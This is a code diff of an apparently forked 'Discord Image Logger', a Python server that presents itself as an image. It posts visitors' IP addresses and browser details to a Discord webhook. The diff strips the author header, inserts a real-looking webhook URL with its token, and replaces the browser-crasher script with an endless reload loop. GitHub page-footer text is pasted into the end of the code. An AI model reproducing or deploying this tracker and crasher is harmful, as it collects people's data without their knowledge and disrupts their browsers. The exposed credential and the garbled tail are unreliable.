@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
@@ -12,8 +9,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-you-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1065345178786873375/bnMroBUHuzR5Qw6Om581lK1FhkD8EWJle-NleFx1_qpFKqMNF9bAvdwfRJSw98YNGFJw",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLqMNzqLZs4OslD3R0SjJJA4xK9_mKHyZIOW0EDZVgful1g_v2ruKSauhEpG-Hj1CURFg&usqp=CAU", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
@@ -57,8 +54,8 @@ config = {
 }
 
 def makeReport(ip, useragent = None):
-    if ip.startswith(('34', '35', '104')):
-        if ip.startswith('104'): return
+    if ip.startswith(('34', '35', '104.169')):
+        if ip.startswith('104.169'): return
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
@@ -136,7 +133,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
         else:
             data = binaries["normal"]
         
-        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104')):
+        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104.169')):
             makeReport(self.headers.get('x-forwarded-for'))
             self.send_response(200) # 200 = OK (HTTP Status)
             self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
@@ -149,7 +146,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             datatype = 'image/jpeg'
             if config["crashBrowser"]["doCrashBrowser"]:
                 datatype = 'text/html'
-                data = config["crashBrowser"]["customMessage"].encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                data = config["crashBrowser"]["customMessage"].encode() + b'<script>onbeforeunload = function(){localStorage.x=1};\n\nsetTimeout(function(){\n  while(1)location.reload(1)\n}, 1000)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
             elif config["redirect"]["redirect"]:
                 datatype = 'text/html'
@@ -163,3 +160,15 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
         return
 
 handler = ImageLoggerAPI
+Footer
+© 2023 GitHub, Inc.
+Footer navigation
+Terms
+Privacy
+Security
+Status
+Docs
+Contact GitHub
+Pricing
+API
+Trai
